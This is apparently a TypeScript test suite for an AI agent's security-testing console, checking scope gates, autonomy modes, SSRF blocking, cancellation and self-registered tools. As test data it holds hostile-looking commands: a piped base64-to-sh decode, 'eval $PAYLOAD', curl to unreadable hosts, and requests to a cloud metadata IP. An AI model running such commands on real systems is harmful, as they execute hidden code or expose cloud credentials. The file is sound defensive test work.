      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  const opaque = [
    `curl "$TARGET"`,
    "curl $(cat /tmp/host)",
    "echo aGVsbG8= | base64 -d | sh",
    "eval $PAYLOAD",
  ];

  it("escalates an unreadable network destination to the operator in standard mode", async () => {
    for (const command of opaque) {
      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
      const requests: ConsoleScopeRequest[] = [];
      const session = createConsoleSession({
        runtime,
        autonomyMode: "standard",
        requestScope: async (req) => {
          requests.push(req);
          return null;
        },
      });

      const outcome = await session.send("go");
      // The operator is asked — and the request carries the actual call, so the
      // surface can show the command even though there is no URL to show.
      expect(requests, `command: ${command}`).toHaveLength(1);
      expect(requests[0].unresolvedTargets ?? [], `command: ${command}`).not.toHaveLength(0);
      expect(requests[0].call.arguments).toEqual({ command });
      expect(outcome.toolCalls[0].result.success, `command: ${command}`).toBe(false);
    }
  });

  it("RUNS an unreadable local command in yolo without prompting (operator opted into full autonomy)", async () => {
    // `base64 --decode` is flagged unresolvable by the shell scanner (it hides
    // its payload), but it is a LOCAL command with no network reach. YOLO is the
    // operator's explicit full-autonomy opt-in, so the scope gate no longer
    // refuses an unreadable command — it runs (the executor's SSRF rail still
    // governs any real egress beneath). Only a FOREIGN NAMED host stays refused.
    const prevRequireScope = process.env["0SEC_REQUIRE_SCOPE"];
    delete process.env["0SEC_REQUIRE_SCOPE"];
    try {
      const runtime = new ScriptedRuntime([bashTurn("c1", `echo aGk= | base64 -d`), endTurn("done")]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        autonomyMode: "yolo",
        scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
        requestScope: async () => {
          prompts += 1;
          return null;
        },
      });

      const outcome = await session.send("go");
      expect(prompts).toBe(0);
      expect(outcome.toolCalls[0].result.success).toBe(true);
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("cannot resolve");
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("YOLO mode");
    } finally {
      if (prevRequireScope !== undefined) process.env["0SEC_REQUIRE_SCOPE"] = prevRequireScope;
    }
  });

  it("remembers a declined opaque command instead of re-prompting for it", async () => {
    const runtime = new ScriptedRuntime([
      bashTurn("c1", `curl "$TARGET"`),
      endTurn("declined"),
      bashTurn("c2", `curl "$TARGET"`),
      endTurn("auto-denied"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("go");
    const second = await session.send("go again");
    expect(prompts).toBe(1);
    expect(second.toolCalls[0].result.error).toContain("already declined");
  });

  it("still falls through to the executor when no requestScope callback is wired", async () => {
    // The SCOPE gate must not turn "no requestScope callback" into a denial —
    // the executor's own validation governs. (An approveTool IS supplied so the
    // standard-mode per-action approval floor is satisfied; the point here is
    // purely that the absent SCOPE callback does not itself block the call.)
    const runtime = new ScriptedRuntime([bashTurn("c1", "echo ok"), endTurn("done")]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => true,
    });
    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });
});

describe("Console autonomy — yolo: no preconfigured scope, but the target still anchors it", () => {
  it("runs a network-capable local command in yolo with NO scope and NO prompt", async () => {
    // The previous model refused this ("configure a scope first"). The new yolo
    // drops that requirement: `bash echo hello` reaches no network destination,
    // so it runs with no scope configured and no prompt of any kind.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      approveTool: async () => {
        throw new Error("approveTool must not be called in yolo mode");
      },
    });

    const outcome = await session.send("go");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("reaches the launch target in yolo with no preconfigured scope, without prompting", async () => {
    // No scope object, just a launch target. yolo auto-expands to the target
    // host itself (the anchor) — no prompt — and the call passes the scope gate.
    // (The subsequent real network fetch is irrelevant; we assert it was not
    // blocked by the scope gate and that the scope now covers the target.)
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://target.test/health" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      target: "https://target.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit the target");
    expect(prompts).toBe(0);
    expect(session.scope?.match("https://target.test/health").allowed).toBe(true);
  });

  it("REFUSES a host outside the target anchor — not auto-authorized — with no prompt", async () => {
    // The authorization anchor bounds yolo: a host that is neither the launch
    // target nor a sub-domain of it is refused outright, never auto-expanded,
    // and never prompted.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://unrelated.test/x" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      target: "https://target.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const outcome = await session.send("try to pivot off-target");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("outside the yolo authorization anchor");
    // The unrelated host was NOT quietly added to scope.
    expect(session.scope?.match("https://unrelated.test/x").allowed ?? false).toBe(false);
  });

  it("RUNS a command it cannot statically resolve in yolo, with no prompt", async () => {
    // Previously yolo refused any command whose destination it couldn't read.
    // That blocked legitimate local work, so yolo now RUNS it (SSRF rail still
    // governs real egress beneath); only a foreign NAMED host stays refused.
    const prevRequireScope = process.env["0SEC_REQUIRE_SCOPE"];
    delete process.env["0SEC_REQUIRE_SCOPE"];
    try {
      const runtime = new ScriptedRuntime([
        { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: `echo aGk= | base64 -d` } }], stopReason: "tool_use", durationMs: 1 },
        endTurn("done"),
      ]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        autonomyMode: "yolo",
        target: "https://target.test",
        requestScope: async () => {
          prompts += 1;
          return null;
        },
      });

      const outcome = await session.send("run an opaque local command");
      expect(prompts).toBe(0);
      expect(outcome.toolCalls[0].result.success).toBe(true);
      expect(outcome.toolCalls[0].result.error ?? "").not.toContain("cannot resolve");
    } finally {
      if (prevRequireScope !== undefined) process.env["0SEC_REQUIRE_SCOPE"] = prevRequireScope;
    }
  });

  it("the SSRF / private-network rail STILL blocks in yolo, even for an in-scope local host", async () => {
    // The SSRF rail sits ABOVE scope in the executor: an in-scope host that
    // resolves to a private/metadata address is refused regardless of mode. Here
    // yolo's scope covers the metadata IP (so the console gate approves it), yet
    // the executor's validateTargetUrl still blocks it. No mode bypasses this.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "http://169.254.169.254/latest/meta-data/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      target: "https://target.test", // a public base target
      scope: ScopePolicy.fromJson({ in_scope: ["169.254.169.254", "target.test"] }),
    });

    const outcome = await session.send("try SSRF to the metadata endpoint");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    // The executor's absolute private-network rail, not the scope gate, blocked it.
    expect(outcome.toolCalls[0].result.error).toContain("Local/internal http_request blocked");
  });

  it("lets an in-scope call through in yolo when a scope is configured", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
    });

    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("does not restrict non-network tools in yolo without a scope", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });
    const outcome = await session.send("go");
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });
});

// ── Console autonomy — recon (passive, capability-restricted) ──

describe("Console autonomy — recon: passive, in-scope, no exploitation", () => {
  it("frames the recon persona in the system prompt", () => {
    const p = buildConsoleSystemPrompt({ scanId: "r1", autonomyMode: "recon" });
    expect(p).toContain("Recon mode");
    expect(p).not.toContain("Standard mode");
    expect(p).not.toContain("YOLO mode");
    expect(p).not.toContain("Co-pilot mode");
  });

  it("runs a read-only tool without a prompt or a refusal", async () => {
    // A READ_ONLY tool is non-exploitative, so recon runs it — and recon never
    // uses the per-action approval flow, so no approveTool is consulted.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "recon",
      target: "https://engagement.test",
      approveTool: async () => {
        throw new Error("approveTool must not be called in recon");
      },
    });
    const outcome = await session.send("look up a payload");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Recon mode");
  });

  it("REFUSES an effectful/mutating tool with a clean reason — never prompting", async () => {
    // apply_patch mutates state → outside the passive allow-list. Recon refuses
    // it outright, and the refusal must be a capability denial, not a prompt:
    // neither approveTool nor requestScope is consulted.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "apply_patch", input: { patch: "*** Begin Patch\n*** End Patch" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "recon",
      target: "https://engagement.test",
      approveTool: async () => {
        throw new Error("approveTool must not be called in recon");
      },
      requestScope: async () => {
        throw new Error("requestScope must not be called for a recon-refused tool");
      },
      requestLocalScope: async () => {
        throw new Error("requestLocalScope must not be called for a recon-refused tool");
      },
    });
    const outcome = await session.send("patch it");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("Recon mode");
    expect(outcome.toolCalls[0].result.error).toContain("not permitted");
  });

  it("REFUSES an exploit/shell tool (run_command) with a capability denial", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "run_command", input: { command: "echo x" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "recon", target: "https://engagement.test" });
    const outcome = await session.send("run it");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("Recon mode");
  });

  it("REFUSES raw http_request in recon (can carry any method/body)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://engagement.test/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "recon", target: "https://engagement.test" });
    const outcome = await session.send("fetch it");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("Recon mode");
  });

  it("allows a PASSIVE recon tool past the capability gate but does NOT auto-expand scope", async () => {
    // crawl is a passive-recon tool → permitted by recon's capability gate. But
    // recon (unlike copilot) never auto-expands scope: an in-anchor subdomain
    // still goes to the operator via requestScope. Here we prove BOTH: the tool
    // reached the SCOPE gate (so recon did not refuse it on capability), and the
    // scope gate PROMPTED rather than silently widening.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "crawl", input: { url: "https://api.engagement.test/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let scopePrompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "recon",
      target: "https://engagement.test",
      requestScope: async () => {
        scopePrompts += 1;
        return null; // decline → the call is denied at the scope gate
      },
    });
    const outcome = await session.send("map the api host");
    // The scope gate fired (recon prompts like standard; no copilot auto-expand).
    expect(scopePrompts).toBe(1);
    // The denial came from the SCOPE gate, not the recon capability gate.
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("not permitted");
    expect(outcome.toolCalls[0].result.error).toContain("declined");
    // No scope was silently added.
    expect(session.scope).toBeUndefined();
  });

  it("stays inside the target anchor — a foreign host for a passive tool is put to the operator, not auto-reached", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "surface_sweep", input: { domain: "https://unrelated.example/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let scopePrompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "recon",
      target: "https://engagement.test",
      requestScope: async () => {
        scopePrompts += 1;
        return null;
      },
    });
    const outcome = await session.send("sweep the other host");
    expect(scopePrompts).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(session.scope).toBeUndefined();
  });

  it("the SSRF / private-network rail STILL blocks in recon for a passive recon tool", async () => {
    // Recon routes its allowed passive tools through the SAME executor, so the
    // absolute SSRF rail in validateTargetUrl applies unchanged: a public base
    // target may never be used to reach a private/metadata address, even when
    // the operator-approved scope covers it.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "discover_api_surface", input: { domain: "http://169.254.169.254/" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "recon",
      target: "https://target.test", // public base target
      scope: ScopePolicy.fromJson({ in_scope: ["169.254.169.254", "target.test"] }),
    });
    const outcome = await session.send("map the metadata endpoint");
    // The passive tool was NOT refused by recon's capability gate (it is allowed)…
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Recon mode");
    // …and it discovered NO internal assets: every fetch to the private address
    // was thrown by the SSRF rail inside the scoped fetch, so nothing internal
    // was ever contacted.
    const out = outcome.toolCalls[0].result.output as { total?: number } | null;
    if (out && typeof out.total === "number") {
      expect(out.total).toBe(0);
    }
  });
});

// ── Console turn cancellation (operator AbortSignal) ──

describe("Console turn cancellation — AbortSignal", () => {
  // A one-round result that requests two tools, so a mid-round abort has an
  // outstanding tool_use to close out with a synthetic tool_result.
  function twoToolRound(idA: string, idB: string): NativeRuntimeResult {
    return {
      content: [
        { type: "tool_use", id: idA, name: "payload_lookup", input: { name: "jsfuck_alert" } },
        { type: "tool_use", id: idB, name: "payload_lookup", input: { name: "jsfuck_alert" } },
      ],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }
  function oneToolRound(id: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "payload_lookup", input: { name: "jsfuck_alert" } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }
  function toolUseIds(msg: NativeMessage | undefined): string[] {
    return (msg?.content ?? [])
      .filter((b): b is Extract<NativeContentBlock, { type: "tool_use" }> => b.type === "tool_use")
      .map((b) => b.id)
      .sort();
  }
  function toolResultIds(msg: NativeMessage | undefined): string[] {
    return (msg?.content ?? [])
      .filter((b): b is Extract<NativeContentBlock, { type: "tool_result" }> => b.type === "tool_result")
      .map((b) => b.tool_use_id)
      .sort();
  }

  it("returns immediately with `cancelled` for an already-aborted signal — no model call, no history change", async () => {
    const runtime = new ScriptedRuntime([endTurn("must never run")]);
    const session = createConsoleSession({ runtime });
    const controller = new AbortController();
    controller.abort();

    const outcome = await session.send("hello", undefined, { signal: controller.signal });

    expect(outcome.stopReason).toBe("cancelled");
    expect(outcome.toolCalls).toHaveLength(0);
    // No model call was issued...
    expect(runtime.calls).toHaveLength(0);
    // ...and the user message was never even appended (history is pristine).
    expect(session.messages).toHaveLength(0);
    // The budget is still carried, reading zero.
    expect(outcome.budget.tokensUsed).toBe(0);
    expect(outcome.budget.tokenBudget).toBeGreaterThan(0);
  });

  it("aborting between rounds stops the loop and reports `cancelled` with the budget spent", async () => {
    const runtime = new ScriptedRuntime([
      { ...oneToolRound("c1"), usage: { inputTokens: 7, outputTokens: 3 } },
      endTurn("second round must not run"),
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    // Fire the abort once the first round's tool has resolved; the loop then
    // trips the between-rounds checkpoint before the next model call.
    const outcome = await session.send(
      "go",
      { onToolResult: () => controller.abort() },
      { signal: controller.signal },
    );

    expect(outcome.stopReason).toBe("cancelled");
    expect(outcome.toolCalls).toHaveLength(1); // the first tool really ran
    expect(outcome.toolCalls[0].result.success).toBe(true);
    // Only the first model call happened; the second (endTurn) was never issued.
    expect(runtime.calls).toHaveLength(1);
    // The spent budget is reported.
    expect(outcome.budget.tokensUsed).toBe(10);
    expect(outcome.budget.iterations).toBe(1);
  });

  it("aborting mid-round still yields matching tool_use / tool_result ids (integrity)", async () => {
    const runtime = new ScriptedRuntime([
      twoToolRound("call-A", "call-B"),
      endTurn("must not run"),
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    let results = 0;
    const outcome = await session.send(
      "run both",
      {
        // Abort after the FIRST tool resolves; the second tool hits the
        // pre-dispatch checkpoint and must be closed out synthetically.
        onToolResult: () => {
          results += 1;
          if (results === 1) controller.abort();
        },
      },
      { signal: controller.signal },
    );

    expect(outcome.stopReason).toBe("cancelled");

    // The conversation-integrity invariant: every tool_use has a matching
    // tool_result, by id.
    const assistantMsg = session.messages.find(
      (m) => m.role === "assistant" && m.content.some((b) => b.type === "tool_use"),
    );
    const resultMsg = session.messages.find(
      (m) => m.role === "user" && m.content.some((b) => b.type === "tool_result"),
    );
    expect(toolUseIds(assistantMsg)).toEqual(["call-A", "call-B"]);
    expect(toolResultIds(resultMsg)).toEqual(["call-A", "call-B"]);

    // The first tool genuinely ran; the second was a synthetic cancellation.
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(outcome.toolCalls[1].result.error).toContain("cancelled by operator");
  });

  it("after a cancelled turn, a subsequent send resumes cleanly and re-runs nothing", async () => {
    const runtime = new ScriptedRuntime([
      oneToolRound("c1"), // round 1 — will be cancelled between rounds
      endTurn("resumed and done"), // the resume's first (and only) model call
    ]);
    const controller = new AbortController();
    const session = createConsoleSession({ runtime });

    const first = await session.send(
      "go",
      { onToolResult: () => controller.abort() },
      { signal: controller.signal },
    );
    expect(first.stopReason).toBe("cancelled");
    expect(runtime.calls).toHaveLength(1);

    // Resume with a fresh (unsignalled) send.
    const second = await session.send("continue");
    expect(second.stopReason).toBe("end_turn");
    // Nothing re-run: the resume dispatched no tools of its own.
    expect(second.toolCalls).toHaveLength(0);
    // The resume's model call saw the earlier tool_result already in history,
    // so the model does not re-request the completed tool.
    const resumeMessages = runtime.calls[1].messages;
    expect(
      resumeMessages.some((m) =>
        m.content.some((b) => b.type === "tool_result" && b.tool_use_id === "c1"),
      ),
    ).toBe(true);
  });

  it("cancellation does not clear denied-host memory or granted scope", async () => {
    const runtime = new ScriptedRuntime([
      httpTurn("c1", "https://blocked.test/a"), // turn 1: declined → remembered
      endTurn("declined"),
      httpTurn("c2", "https://ok.test/b"), // turn 2: approve a scope
      endTurn("scope granted"),
      // turn 3 is an already-aborted cancel — issues no model call.
      httpTurn("c3", "https://blocked.test/c"), // turn 4: must still be denied
      endTurn("still denied from memory"),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      requestScope: async (req) => {
        prompts += 1;
        // Decline blocked.test; approve anything else with a covering scope.
        if (req.requestedUrls.some((u) => u.includes("blocked.test"))) return null;
        return {
          target: "https://ok.test",
          scope: ScopePolicy.fromJson({ in_scope: ["ok.test"] }),
        };
      },
    });

    await session.send("hit blocked.test"); // prompt #1 → declined & remembered
    await session.send("hit ok.test"); // prompt #2 → scope granted
    expect(prompts).toBe(2);
    expect(session.scope).toBeDefined();

    // The cancelled turn: an already-aborted signal, no model call.
    const controller = new AbortController();
    controller.abort();
    const cancelled = await session.send("try to cancel", undefined, { signal: controller.signal });
    expect(cancelled.stopReason).toBe("cancelled");
    // Turns 1 & 2 each made two model calls (tool round + endTurn); the cancel
    // itself issued none.
    expect(runtime.calls).toHaveLength(4);

    // Granted scope survived the cancel.
    expect(session.scope).toBeDefined();

    // Denied-host memory survived the cancel: blocked.test is still auto-denied
    // WITHOUT a fresh prompt (prompts stays 2).
    const after = await session.send("hit blocked.test again");
    expect(after.toolCalls[0].result.success).toBe(false);
    expect(after.toolCalls[0].result.error).toContain("already declined");
    expect(prompts).toBe(2);
  });

  it("no signal passed = today's behaviour exactly (normal tool turn unaffected)", async () => {
    const runtime = new ScriptedRuntime([
      { ...oneToolRound("c1"), usage: { inputTokens: 4, outputTokens: 2 } },
      endTurn("done normally"),
    ]);
    const session = createConsoleSession({ runtime });

    const seen: string[] = [];
    // Callbacks but no opts — the historical two-argument call shape.
    const outcome = await session.send("go", {
      onToolStart: (c) => seen.push(`start:${c.name}`),
      onToolResult: (c, r) => seen.push(`result:${c.name}:${r.success}`),
    });

    expect(outcome.stopReason).toBe("end_turn");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(seen).toEqual(["start:payload_lookup", "result:payload_lookup:true"]);
    expect(outcome.budget.tokensUsed).toBe(6);
  });
});

// ── Session-registered tools: self-extension + plugin host (0sec console) ──────
//
// The interactive console turn loop wires the SAME two kinds of session-
// registered tools the scan `runNativeAgentLoop` supports: (1) model self-
// extension (the gated `self_extend` + the tools it registers) and (2) plugin-
// host tools. Both unions refresh at the TURN BOUNDARY and both are subject to
// every existing per-call gate. Absent config = today's behaviour exactly.
describe("createConsoleSession — session-registered tools", () => {
  // A manifest a `self_extend` call registers. filesystem-read → the tool is
  // read-only (exempt from the standard approval gate) and needs only local
  // scope, which falls through to "approved" with no callback wired.
  const EXT_MANIFEST = {
    id: "acme.probe-pack",
    name: "Probe Pack",
    version: "1.0.0",
    tools: [
      {
        name: "acme_probe",
        description: "A model-authored probe.",
        parameters: { note: { type: "string", description: "a note" } },
        required: [],
        capabilities: ["filesystem-read"],
      },
    ],
  };

  function toolUseRound(id: string, name: string, input: Record<string, unknown>): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name, input }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  /**
   * A minimal stand-in for the real PluginHost that models the loader's
   * enablement contract: `toolDefinitions()`/`ownsTool()` report ONLY the one
   * enabled plugin tool, so the console injects exactly what the host vouches
   * for. `calls` records every dispatch so the test can prove the call was
   * routed THROUGH the host, not the built-in executor.
   */
  function makePluginHost(): PluginHost & { calls: string[] } {
    const calls: string[] = [];
    const def: ToolDefinition = {
      name: "plug_tool",
      description: "A tool contributed by an enabled plugin.",
      parameters: { q: { type: "string", description: "query" } },
      required: [],
    };
    const host = {
      calls,
      toolDefinitions: () => [def],
      gateMaps: () => ({
        networkCapable: {} as Record<string, true>,
        localScope: {} as Record<string, true>,
        readOnly: { plug_tool: true } as Record<string, true>,
      }),
      capabilityFlagsFor: (n: string) =>
        n === "plug_tool"
          ? { networkCapable: false, localScope: false, readOnly: true }
          : undefined,
      ownsTool: (n: string) => n === "plug_tool",
      call: async (n: string) => {
        calls.push(n);
        return {
          ok: true as const,
          content: "plugin says hi",
          failed: false,
          truncated: false,
          neutralized: false,
          markers: [],
        };
      },
    };
    return host as unknown as PluginHost & { calls: string[] };
  }

  it("injects `self_extend` into the model tool set ONLY when self-extension is enabled", async () => {
    const on = new ScriptedRuntime([endTurn("ready")]);
    const enabled = createConsoleSession({ runtime: on, allowModelSelfExtension: true });
    await enabled.send("go");
    expect(on.calls[0].tools.map((t) => t.name)).toContain("self_extend");

    const off = new ScriptedRuntime([endTurn("ready")]);
    const disabled = createConsoleSession({ runtime: off });
    await disabled.send("go");
    expect(off.calls[0].tools.map((t) => t.name)).not.toContain("self_extend");
  });

  it("makes a `self_extend`-registered tool callable on the NEXT turn and guard-evaluates it", async () => {
    const runtime = new ScriptedRuntime([
      toolUseRound("r1", "self_extend", { manifest: EXT_MANIFEST }),
      toolUseRound("r2", "acme_probe", {}),
      endTurn("done"),
    ]);
    // approveTool present so the (non-read-only) self_extend clears the standard
    // approval gate + guard floor — the injected tool goes through the SAME gates.
    const approved: string[] = [];
    const session = createConsoleSession({
      runtime,
      allowModelSelfExtension: true,
      approveTool: async (c) => {
        approved.push(c.name);
        return true;
      },
    });

    const outcome = await session.send("build yourself a tool");

    // Registration succeeded (the registry accepted the manifest).
    const reg = outcome.toolCalls.find((c) => c.call.name === "self_extend");
    expect(reg?.result.success).toBe(true);
    // The approval gate ran for the effectful self_extend call.
    expect(approved).toContain("self_extend");

    // Turn-boundary refresh: acme_probe is absent from the FIRST model call's
    // tool set and present on the SECOND (after registration).
    expect(runtime.calls[0].tools.map((t) => t.name)).not.toContain("acme_probe");
    expect(runtime.calls[1].tools.map((t) => t.name)).toContain("acme_probe");

    // Calling it was guard-evaluated and returned the honest no-body result.
    const probe = outcome.toolCalls.find((c) => c.call.name === "acme_probe");
    expect(probe?.result.success).toBe(false);
    expect(probe?.result.error).toContain("passed its declared guards");
    expect(probe?.result.error).toContain("no executable implementation");
  });

  it("does not construct a registry when self-extension is disabled (self_extend refuses if reached)", async () => {
    // Even if the model somehow emits `self_extend` with the feature OFF, it is
    // not advertised AND the executor's front door refuses (no registry wired).
    const runtime = new ScriptedRuntime([
      toolUseRound("r1", "self_extend", { manifest: EXT_MANIFEST }),
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });
    const outcome = await session.send("try to self-extend");
    const reg = outcome.toolCalls.find((c) => c.call.name === "self_extend");
    expect(reg?.result.success).toBe(false);
    expect(reg?.result.error).toContain("self-extension is disabled");
  });

  it("unions an enabled plugin's tools into the model set and dispatches them THROUGH the host", async () => {
    const host = makePluginHost();
    const runtime = new ScriptedRuntime([
      toolUseRound("p1", "plug_tool", { q: "hello" }),
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, pluginHost: host });

    const outcome = await session.send("use the plugin");

    // The enabled plugin tool was advertised to the model.
    expect(runtime.calls[0].tools.map((t) => t.name)).toContain("plug_tool");
    // It was dispatched through the host and its content came back as the result.
    expect(host.calls).toEqual(["plug_tool"]);
    const call = outcome.toolCalls.find((c) => c.call.name === "plug_tool");
    expect(call?.result.success).toBe(true);
    expect(call?.result.output).toBe("plugin says hi");
  });

  it("injects plugin tools ONLY when a host is supplied, and ONLY the tools it owns", async () => {
    // No host → no plugin tool in the model set.
    const noHost = new ScriptedRuntime([endTurn("x")]);
    const s1 = createConsoleSession({ runtime: noHost });
    await s1.send("go");
    expect(noHost.calls[0].tools.map((t) => t.name)).not.toContain("plug_tool");

    // Host supplied → exactly the host's owned/enabled tool is present; a name
    // the host does not own is never injected.
    const host = makePluginHost();
    const withHost = new ScriptedRuntime([endTurn("x")]);
    const s2 = createConsoleSession({ runtime: withHost, pluginHost: host });
    await s2.send("go");
    const names = withHost.calls[0].tools.map((t) => t.name);
    expect(names).toContain("plug_tool");
    expect(names).not.toContain("disabled_tool");
  });

  it("leaves the model-facing tool set unchanged when NEITHER feature is configured", async () => {
    const runtime = new ScriptedRuntime([endTurn("x")]);
    const session = createConsoleSession({ runtime });
    await session.send("go");
    const advertised = runtime.calls[0].tools.map((t) => t.name).sort();
    const base = session.tools.map((t) => t.name).sort();
    // Byte-for-byte the built-in registry: no self_extend, no plugin tools.
    expect(advertised).toEqual(base);
    expect(advertised).not.toContain("self_extend");
  });
});
